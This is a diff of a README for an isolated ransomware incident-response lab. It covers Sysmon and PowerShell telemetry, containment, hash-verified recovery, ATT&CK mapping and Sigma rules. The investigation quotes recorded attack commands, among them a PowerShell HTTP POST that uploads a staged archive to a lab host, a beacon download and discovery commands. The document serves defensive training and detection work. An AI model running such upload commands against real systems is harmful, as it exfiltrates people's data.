@@ -1,686 +1,471 @@
-\# Ransomware Incident Response \& Detection Engineering Lab
+# Ransomware Incident Response & Detection Engineering Lab
 
+An end-to-end incident response investigation of a controlled ransomware-style intrusion against a Windows 11 endpoint, covering forensic reconstruction, containment, eradication, recovery, MITRE ATT&CK mapping, and Sigma detection engineering.
 
+> **Safety:** This project was conducted entirely in an isolated virtual lab using synthetic data. No real ransomware was executed, no real files were encrypted, and no data was transmitted to external systems.
 
-An end-to-end incident response investigation of a controlled ransomware-style intrusion against a Windows 11 endpoint, covering forensic reconstruction, containment, eradication, recovery, MITRE ATT\&CK mapping, and Sigma detection engineering.
+---
 
-
-
-> \*\*Safety:\*\* This project was conducted entirely in an isolated virtual lab using synthetic data. No real ransomware was executed, no real files were encrypted, and no data was transmitted to external systems.
-
-
-
-\---
-
-
-
-\## Project Overview
-
-
+## Project Overview
 
 This project simulates the workflow of an Incident Response Analyst investigating a ransomware-style security incident.
 
-
-
 Rather than focusing only on attack simulation, the project focuses on the defensive investigation:
 
-
-
-\*\*What happened? How can it be proven from telemetry? How should the system be contained and recovered? What detections can be created from the observed behavior?\*\*
-
-
+**What happened? How can it be proven from telemetry? How should the system be contained and recovered? What detections can be created from the observed behavior?**
 
 The investigation uses Windows endpoint telemetry and controlled network evidence to reconstruct activity across multiple stages of an incident.
 
-
-
-\### Investigation Lifecycle
-
-
+### Investigation Lifecycle
 
 ```text
-
 Initial Execution
-
-&#x20;      ↓
-
+       |
+       v
 Discovery
-
-&#x20;      ↓
-
-Account Creation \& Privilege Modification
-
-&#x20;      ↓
-
-Data Collection \& Staging
-
-&#x20;      ↓
-
+       |
+       v
+Account Creation & Privilege Modification
+       |
+       v
+Data Collection & Staging
+       |
+       v
 Controlled Exfiltration
-
-&#x20;      ↓
-
+       |
+       v
 Ransomware-Like Impact
-
-&#x20;      ↓
-
+       |
+       v
 Containment
-
-&#x20;      ↓
-
-Eradication \& Recovery
-
-&#x20;      ↓
-
+       |
+       v
+Eradication & Recovery
+       |
+       v
 Forensic Reconstruction
-
-&#x20;      ↓
-
+       |
+       v
 Detection Engineering
-
 ```
 
+---
 
-
-\---
-
-
-
-\## Lab Architecture
-
-
+## Lab Architecture
 
 ```text
-
-┌─────────────────────────────┐
-
-│ Windows 11 Endpoint         │
-
-│ WIN-O7S4P69OAEE             │
-
-│ 192.168.64.12               │
-
-│                             │
-
-│ Sysmon                      │
-
-│ Security Event Log          │
-
-│ PowerShell Logging          │
-
-└──────────────┬──────────────┘
-
-&#x20;              │
-
-&#x20;              │ Controlled Lab Traffic
-
-&#x20;              │
-
-&#x20;              ▼
-
-┌─────────────────────────────┐
-
-│ Kali Linux                  │
-
-│ 192.168.64.11               │
-
-│                             │
-
-│ Controlled HTTP Server      │
-
-│ Controlled Upload Receiver  │
-
-└─────────────────────────────┘
-
++--------------------------------+
+| Windows 11 Endpoint            |
+| WIN-O7S4P69OAEE                |
+| 192.168.64.12                  |
+|                                |
+| Sysmon                         |
+| Security Event Log             |
+| PowerShell Logging             |
++---------------+----------------+
+                |
+                | Controlled Lab Traffic
+                |
+                v
++--------------------------------+
+| Kali Linux                     |
+| 192.168.64.11                  |
+|                                |
+| Controlled HTTP Server         |
+| Controlled Upload Receiver     |
++--------------------------------+
 ```
-
-
 
 The environment was hosted using isolated virtual machines. Network activity used only lab-controlled systems.
 
+---
 
+## Telemetry Sources
 
-\---
+The investigation correlated multiple evidence sources instead of relying on a single log source:
 
+- Sysmon Event ID 1 — Process Creation
+- Sysmon Event ID 3 — Network Connection
+- Sysmon Event ID 11 — File Creation
+- Windows Security Event ID 4720 — User Account Creation
+- PowerShell Event ID 4104 — Script Block Logging
+- Windows Firewall configuration
+- Controlled HTTP server and upload receiver logs
+- File-system artifacts
+- SHA-256 hashes
+- Analyst-created evidence summaries and forensic timeline
 
+This correlation allowed endpoint, network, account, file, and PowerShell activity to be reconstructed as one incident.
 
-\## Telemetry Sources
+---
 
+## Incident Narrative
 
+### Initial Execution
 
-The investigation correlated evidence from:
+PowerShell retrieved a controlled beacon file from the lab-controlled Kali host:
 
+```text
+http://192.168.64.11:8080/beacon.txt
+```
 
+The activity was supported by PowerShell Script Block Logging, Sysmon process creation, Sysmon network connection telemetry, file creation telemetry, and the HTTP server log.
 
-\- Sysmon
+![PowerShell initial execution evidence](screenshots/02-powershell-initial-access.png)
 
-\- Windows Security Event Log
+---
 
-\- PowerShell Operational Log
+### Discovery
 
-\- Windows filesystem artifacts
+A sequence of host and account discovery commands followed the initial execution, including:
 
-\- SHA256 cryptographic hashes
+```text
+whoami
+hostname
+ipconfig /all
+whoami /priv
+net user
+net localgroup administrators
+arp -a
+```
 
-\- Kali Linux HTTP server logs
+The commands were reconstructed using Sysmon process creation telemetry and parent/child process relationships.
 
-\- Kali Linux receiver logs
+The observed activity is consistent with post-compromise discovery used to understand the victim host, network configuration, local users, privileges, and administrative groups.
 
+---
 
+### Account Activity
 
-Cross-source correlation was used wherever possible instead of relying on a single telemetry source.
+A local account named:
 
+```text
+IRLab_Backup
+```
 
+was created during the simulation.
 
-\---
+Windows Security Event ID **4720** independently confirmed the account creation.
 
+![Windows Security Event 4720 account creation](screenshots/03-account-creation-4720.png)
 
+The account was later disabled during containment and deleted during eradication.
 
-\## Incident Narrative
+A Security Event ID 4732 event was **not observed**, so this project does not claim that such an event was captured.
 
+---
 
+### Collection & Staging
 
-\### Initial Execution
+Three synthetic training files were copied into a local staging directory:
 
+```text
+financial_report.txt
+payroll.txt
+customers.txt
+```
 
+The files were then compressed into:
 
-PowerShell retrieved a controlled test artifact from the Kali Linux system using `Invoke-WebRequest`.
+```text
+C:\IR-Lab\Staging\collected_data.zip
+```
 
+PowerShell Event ID 4104 captured the `Copy-Item` and `Compress-Archive` activity.
 
+![PowerShell collection and staging evidence](screenshots/04-data-staging-archive.png)
 
-Telemetry captured:
+The staged archive had SHA-256:
 
+```text
+D62DF6CE434E4206E6CEA6D3F012E9DAC43AC506D322ADD502295136BB6632F5
+```
 
+---
 
-\- PowerShell process creation
+### Controlled Exfiltration
 
-\- Script Block execution
+The staged archive was transferred from the Windows endpoint to the lab-controlled Kali host using an HTTP POST request.
 
-\- Network communication
+PowerShell recorded:
 
-\- File creation
+```text
+Invoke-WebRequest
+-Uri "http://192.168.64.11:8080/upload"
+-Method POST
+-InFile "C:\IR-Lab\Staging\collected_data.zip"
+```
 
-\- Receiver-side HTTP activity
+![Controlled exfiltration PowerShell evidence](screenshots/05-controlled-exfiltration.png)
 
+The transfer was corroborated by multiple evidence sources:
 
+- PowerShell Event ID 4104 recorded the upload command.
+- Sysmon Event ID 3 recorded a connection from `192.168.64.12` to `192.168.64.11:8080`.
+- The controlled receiver recorded an HTTP POST from the Windows host.
+- The receiver reported receiving 560 bytes.
+- Source and destination SHA-256 hashes matched.
 
-\### Discovery
+Therefore, controlled exfiltration of the staged training archive was confirmed within the isolated lab.
 
+---
 
+### Ransomware-Like Impact
 
-A burst of reconnaissance commands enumerated:
+The impact phase intentionally simulated ransomware symptoms **without executing ransomware or encrypting data**.
 
+The three training files were renamed with a `.locked` extension and a training ransom-note artifact was created.
 
+Hash verification showed that each `.locked` file remained identical to its known-good recovery copy.
 
-\- Current user
+![Impact hash verification](screenshots/06-impact-hash-verification.png)
 
-\- Hostname
+Because the contents were unchanged, the evidence supports **filename modification only**, not encryption.
 
-\- Network configuration
+A read-only `vssadmin list shadows` command was also executed. No shadow copies were deleted or modified.
 
-\- User privileges
+For these reasons, this project does **not** claim ATT&CK techniques T1486 (Data Encrypted for Impact) or T1490 (Inhibit System Recovery).
 
-\- Local accounts
+---
 
-\- Local administrator membership
+## Containment, Eradication & Recovery
 
-\- ARP cache
+Containment began at approximately **7:17:10 PM** and ended at approximately **7:19:19 PM**, for a documented duration of **2 minutes 9 seconds**.
 
+Containment actions included:
 
+- Blocking outbound communication to `192.168.64.11`
+- Blocking inbound communication from `192.168.64.11`
+- Disabling `IRLab_Backup`
+- Checking for active TCP connections to the known remote host
+- Preserving evidence before eradication
 
-Sysmon process relationships allowed the discovery activity to be correlated with a common PowerShell parent process.
+![Network and account containment evidence](screenshots/07-network-containment.png)
 
+No active TCP connections to the known remote host were observed at the time of containment.
 
+A subsequent TCP connectivity test was unsuccessful; however, the Kali HTTP listener had also been stopped. Therefore, the failed connectivity test alone is **not** treated as proof that the firewall caused the failure. The enabled firewall rules independently confirm that explicit network blocks were implemented.
 
-\### Account Activity
+During eradication and recovery:
 
+- `IRLab_Backup` was deleted.
+- The simulated `.locked` artifacts were removed.
+- Known-good copies were restored.
+- SHA-256 hashes of the restored files matched the recovery copies.
 
+This provided integrity-based verification of successful recovery.
 
-A controlled local account named `IRLab\_Backup` was created and subsequently added to the local Administrators group.
+---
 
+## MITRE ATT&CK Mapping
 
+| Technique | Description | Evidence |
+|---|---|---|
+| T1059.001 | PowerShell | PowerShell used throughout multiple phases |
+| T1105 | Ingress Tool Transfer | Controlled `beacon.txt` retrieved over HTTP |
+| T1033 | System Owner/User Discovery | `whoami` |
+| T1016 | System Network Configuration Discovery | `ipconfig /all`, network discovery |
+| T1087.001 | Account Discovery: Local Account | `net user` |
+| T1069.001 | Permission Groups Discovery: Local Groups | `net localgroup administrators` |
+| T1136.001 | Create Account: Local Account | `IRLab_Backup` account creation |
+| T1098.007 | Account Manipulation: Additional Local or Domain Groups | Administrative group modification activity |
+| T1074.001 | Data Staged: Local Data Staging | Files copied to staging directory |
+| T1560.001 | Archive Collected Data | `Compress-Archive` created staged ZIP |
+| T1041 | Exfiltration Over C2 Channel | Controlled HTTP POST to lab receiver |
 
-Windows Security Event ID 4720 independently confirmed account creation.
+### Evidence-Based Exclusions
 
+Two ransomware-associated techniques were deliberately **not** claimed:
 
+**T1486 — Data Encrypted for Impact**
 
-Security Event ID 4732 was not observed, so administrator-group modification was established using process command-line telemetry and membership verification rather than claiming unavailable evidence.
+The `.locked` files had SHA-256 hashes identical to their known-good copies. No encryption occurred.
 
+**T1490 — Inhibit System Recovery**
 
+`vssadmin` was used only to list shadow copies. No command deleting or modifying shadow copies was executed.
 
-\### Collection \& Staging
+This distinction demonstrates evidence-based ATT&CK mapping rather than mapping techniques solely because they are commonly associated with ransomware.
 
+---
 
+## Detection Engineering
 
-Three synthetic training documents were copied into a staging directory and compressed into:
-
-
-
-`collected\_data.zip`
-
-
-
-PowerShell Script Block Logging and Sysmon File Create telemetry captured the staging activity.
-
-
-
-\### Controlled Exfiltration
-
-
-
-The staged archive was transferred to the Kali lab host using an HTTP POST request.
-
-
-
-Successful transfer was established through multiple evidence sources:
-
-
-
-\- PowerShell upload command
-
-\- Sysmon network connection
-
-\- Receiver-side logging
-
-\- Matching transfer size
-
-\- Matching SHA256 hashes
-
-
-
-\### Ransomware-Like Impact
-
-
-
-Three controlled files were renamed with a `.locked` extension and a simulated ransom note was created.
-
-
-
-The exercise deliberately did \*\*not\*\* perform real encryption.
-
-
-
-Hash comparison showed that the affected files remained identical to known-good copies at the content level.
-
-
-
-`vssadmin list shadows` was used only to inspect shadow-copy state. No shadow copies were deleted or modified.
-
-
-
-\---
-
-
-
-\## Containment, Eradication \& Recovery
-
-
-
-Containment included:
-
-
-
-\- Blocking inbound communication from the controlled remote host
-
-\- Blocking outbound communication to the controlled remote host
-
-\- Disabling the suspicious local account
-
-\- Checking for active connections to the known remote system
-
-
-
-Eradication removed the lab-created account.
-
-
-
-Recovery restored the affected training files from known-good copies.
-
-
-
-SHA256 verification confirmed that the recovered files matched their known-good versions.
-
-
-
-\---
-
-
-
-\## MITRE ATT\&CK Mapping
-
-
-
-| Technique | ID |
-
-|---|---|
-
-| PowerShell | T1059.001 |
-
-| Ingress Tool Transfer | T1105 |
-
-| System Owner/User Discovery | T1033 |
-
-| System Network Configuration Discovery | T1016 |
-
-| Account Discovery: Local Account | T1087.001 |
-
-| Permission Groups Discovery: Local Groups | T1069.001 |
-
-| Create Account: Local Account | T1136.001 |
-
-| Account Manipulation | T1098.007 |
-
-| Data Staged: Local Data Staging | T1074.001 |
-
-| Archive Collected Data | T1560.001 |
-
-| Exfiltration Over C2 Channel | T1041 |
-
-
-
-\### Evidence-Based Exclusions
-
-
-
-\*\*T1486 – Data Encrypted for Impact\*\* was intentionally not claimed because the files were renamed rather than encrypted.
-
-
-
-\*\*T1490 – Inhibit System Recovery\*\* was intentionally not claimed because shadow-copy state was queried but no recovery mechanism was deleted or modified.
-
-
-
-\---
-
-
-
-\## Detection Engineering
-
-
-
-Five behavior-based Sigma rules were developed from activity observed during the investigation.
-
-
+Five custom Sigma rules were created from behaviors observed during the investigation:
 
 | Detection | Purpose |
-
 |---|---|
+| `powershell_download.yml` | Detect suspicious PowerShell download behavior |
+| `powershell_http_upload.yml` | Detect PowerShell HTTP upload activity |
+| `powershell_compress_archive.yml` | Detect archive creation through PowerShell |
+| `local_account_creation.yml` | Detect local account creation |
+| `local_admin_group_add.yml` | Detect local administrative group modification |
 
-| `powershell\_download.yml` | Detect PowerShell remote-download behavior |
+The rules are available in the [`detections`](detections/) directory.
 
-| `local\_account\_creation.yml` | Detect local account creation using Windows account-management utilities |
+The detection strategy focuses on behavioral telemetry rather than hard-coding only lab-specific indicators.
 
-| `local\_admin\_group\_add.yml` | Detect local Administrators group modification |
+---
 
-| `powershell\_compress\_archive.yml` | Detect PowerShell archive creation |
+## Sigma Validation
 
-| `powershell\_http\_upload.yml` | Detect PowerShell HTTP POST file-upload behavior |
+The custom Sigma rules were validated using **Sigma CLI 3.1.0**.
 
-
-
-The rules focus on behavioral patterns rather than only hard-coded lab indicators.
-
-
-
-\---
-
-
-
-\## Sigma Validation
-
-
-
-Rules were validated using \*\*Sigma CLI 3.1.0\*\*.
-
-
+Validation result:
 
 ```text
-
 Found 0 errors, 0 condition errors and 0 issues.
-
 No rule errors found.
-
 No condition errors found.
-
 No validation issues found.
-
 ```
 
+![Sigma CLI validation](screenshots/01-sigma-validation.png)
 
+All five rules successfully parsed and passed Sigma CLI validation.
 
-\*\*Result: PASS\*\*
+This confirms rule syntax and validation compliance. It does **not** imply that the rules were deployed to or fired inside a production SIEM.
 
+---
 
+## Key Investigation Findings
 
-The rules were additionally correlated with telemetry generated during the controlled incident.
+1. PowerShell telemetry provided strong visibility into execution, staging, and transfer activity.
+2. Sysmon provided process, network, and file-system evidence that could be correlated with PowerShell logs.
+3. Windows Security Event ID 4720 independently confirmed creation of the suspicious local account.
+4. Data staging was confirmed through file-copy and archive-creation telemetry.
+5. Controlled exfiltration was confirmed through endpoint telemetry, receiver evidence, transferred byte count, and matching hashes.
+6. The ransomware-like impact did not involve encryption; matching hashes proved the contents remained unchanged.
+7. No evidence supported shadow-copy deletion.
+8. Network and account containment were implemented before eradication.
+9. Recovery integrity was verified using SHA-256.
+10. Behavioral findings were converted into reusable Sigma detections.
 
+---
 
+## Evidence Screenshots
 
-Sigma validation confirms rule validity; it does not imply that the rules generated alerts in a production SIEM.
+The screenshots below represent selected evidence from the investigation.
 
+| Investigation Stage | Evidence |
+|---|---|
+| Detection validation | [`01-sigma-validation.png`](screenshots/01-sigma-validation.png) |
+| Initial execution | [`02-powershell-initial-access.png`](screenshots/02-powershell-initial-access.png) |
+| Account creation | [`03-account-creation-4720.png`](screenshots/03-account-creation-4720.png) |
+| Collection and staging | [`04-data-staging-archive.png`](screenshots/04-data-staging-archive.png) |
+| Controlled exfiltration | [`05-controlled-exfiltration.png`](screenshots/05-controlled-exfiltration.png) |
+| Impact verification | [`06-impact-hash-verification.png`](screenshots/06-impact-hash-verification.png) |
+| Containment | [`07-network-containment.png`](screenshots/07-network-containment.png) |
 
+---
 
-\---
-
-
-
-\## Key Investigation Findings
-
-
-
-\- A recurring PowerShell process provided a useful pivot across multiple incident stages.
-
-\- Windows Security Event ID 4720 confirmed suspicious local-account creation.
-
-\- Process telemetry established administrator-group modification even though Event ID 4732 was not available.
-
-\- Data staging and archive creation were reconstructed from PowerShell and Sysmon telemetry.
-
-\- Controlled exfiltration was confirmed using endpoint and receiver-side evidence plus cryptographic hashes.
-
-\- File hashes proved that ransomware-like impact involved renaming rather than encryption.
-
-\- Recovery mechanisms were queried but not destroyed.
-
-\- Containment, eradication, and recovery were completed and verified.
-
-\- Investigation findings were converted into reusable Sigma detection logic.
-
-
-
-\---
-
-
-
-\## Repository Structure
-
-
+## Repository Structure
 
 ```text
-
 Ransomware-IR-Lab/
-
-│
-
-├── README.md
-
-├── .gitignore
-
-│
-
-├── detections/
-
-│   ├── local\_account\_creation.yml
-
-│   ├── local\_admin\_group\_add.yml
-
-│   ├── powershell\_compress\_archive.yml
-
-│   ├── powershell\_download.yml
-
-│   └── powershell\_http\_upload.yml
-
-│
-
-├── docs/
-
-│   └── incident-report.md
-
-│
-
-├── evidence/
-
-│   ├── master-timeline.txt
-
-│   ├── mitre-attack-mapping.txt
-
-│   ├── ioc-and-artifacts.txt
-
-│   ├── detection-coverage-matrix.txt
-
-│   └── sigma-validation-results.txt
-
-│
-
-└── screenshots/
-
+|
++-- README.md
++-- .gitignore
+|
++-- detections/
+|   +-- local_account_creation.yml
+|   +-- local_admin_group_add.yml
+|   +-- powershell_compress_archive.yml
+|   +-- powershell_download.yml
+|   +-- powershell_http_upload.yml
+|
++-- docs/
+|   +-- incident-report.md
+|
++-- evidence/
+|   +-- detection-coverage-matrix.txt
+|   +-- ioc-and-artifacts.txt
+|   +-- master-timeline.txt
+|   +-- mitre-attack-mapping.txt
+|   +-- sigma-validation-results.txt
+|
++-- screenshots/
+    +-- 01-sigma-validation.png
+    +-- 02-powershell-initial-access.png
+    +-- 03-account-creation-4720.png
+    +-- 04-data-staging-archive.png
+    +-- 05-controlled-exfiltration.png
+    +-- 06-impact-hash-verification.png
+    +-- 07-network-containment.png
 ```
 
+Raw EVTX files and other large or potentially sensitive investigation artifacts are intentionally excluded from the public repository.
 
+---
 
-\---
+## Forensic Limitations
 
+Timestamp values across Windows Event Viewer displays, embedded Sysmon UTC fields, and Kali logs showed clock/timezone inconsistencies.
 
+Original timestamps were preserved rather than silently normalized without an established clock offset.
 
-\## Forensic Limitations
+The investigation therefore relies on both timestamp context and causal/event relationships when reconstructing activity.
 
+Additional limitations include:
 
+- The environment is a controlled lab rather than an enterprise network.
+- Synthetic files were used instead of real sensitive information.
+- No destructive ransomware payload was executed.
+- No production SIEM was used to demonstrate live Sigma alerts.
+- The failed post-containment TCP test cannot independently prove firewall effectiveness because the destination listener had already stopped.
 
-Timestamp inconsistencies were observed between Windows Event Viewer display times, embedded Sysmon UTC timestamps, and Kali Linux logs.
+These limitations are intentionally documented to avoid overstating the conclusions.
 
+---
 
+## Skills Demonstrated
 
-Original timestamps were preserved rather than silently normalized, and the discrepancy is documented as an investigative limitation.
+This project demonstrates practical experience with:
 
+- Incident response methodology
+- Windows event-log analysis
+- Sysmon telemetry
+- PowerShell Script Block Logging
+- Process-tree analysis
+- Network connection analysis
+- Account activity investigation
+- File-system forensics
+- SHA-256 integrity verification
+- Data staging and exfiltration analysis
+- Containment decision-making
+- Eradication and recovery
+- MITRE ATT&CK mapping
+- Sigma detection engineering
+- Detection validation
+- Evidence preservation
+- Timeline reconstruction
+- Technical documentation
+- Executive incident reporting
 
+---
 
-The lab also intentionally excluded destructive ransomware behavior, credential theft, enterprise Active Directory infrastructure, and production SIEM deployment.
+## Full Incident Report
 
+The detailed investigation report is available here:
 
+[`docs/incident-report.md`](docs/incident-report.md)
 
-\---
+Supporting evidence and analysis are available in:
 
+[`evidence/`](evidence/)
 
+Custom Sigma detections are available in:
 
-\## Skills Demonstrated
+[`detections/`](detections/)
 
+---
 
+## Disclaimer
 
-\*\*Incident Response\*\*
+This repository documents a **controlled cybersecurity training environment**.
 
-\- Evidence collection
+All systems involved were owned and operated within the isolated lab. All documents contained synthetic training data. Network transfer occurred only between lab-controlled virtual machines.
 
-\- Timeline reconstruction
+No real ransomware was deployed, no unauthorized system was targeted, and no external data exfiltration occurred.
 
-\- Process-tree analysis
-
-\- Incident scoping
-
-\- Containment
-
-\- Eradication
-
-\- Recovery
-
-\- Integrity verification
-
-
-
-\*\*Windows Security\*\*
-
-\- Sysmon analysis
-
-\- Windows Security Event analysis
-
-\- PowerShell Script Block Logging
-
-\- Process and command-line investigation
-
-\- Windows Firewall containment
-
-
-
-\*\*Detection Engineering\*\*
-
-\- Sigma rule development
-
-\- Behavioral detection design
-
-\- Detection-to-evidence correlation
-
-\- Sigma CLI validation
-
-\- MITRE ATT\&CK mapping
-
-
-
-\*\*Forensics\*\*
-
-\- Cross-source event correlation
-
-\- SHA256 verification
-
-\- Artifact analysis
-
-\- Evidence-based conclusions
-
-\- Documentation of telemetry limitations
-
-
-
-\---
-
-
-
-\## Full Incident Report
-
-
-
-The complete investigation is available in:
-
-
-
-\[`docs/incident-report.md`](docs/incident-report.md)
-
-
-
-Additional timelines, ATT\&CK mappings, detection coverage, artifacts, and validation results are available under:
-
-
-
-\[`evidence/`](evidence/)
-
-
-
-Sigma detection rules are available under:
-
-
-
-\[`detections/`](detections/)
-
-
-
-\---
-
-
-
-\## Disclaimer
-
-
-
-This repository documents a cybersecurity training exercise performed exclusively within a controlled virtual laboratory.
-
-
-
-All hosts, accounts, files, network services, and incident artifacts used in the simulation were created for training purposes. No third-party systems were targeted and no real ransomware was deployed.
-
+The project is intended solely to demonstrate defensive incident response, forensic analysis, containment, recovery, and detection-engineering skills.
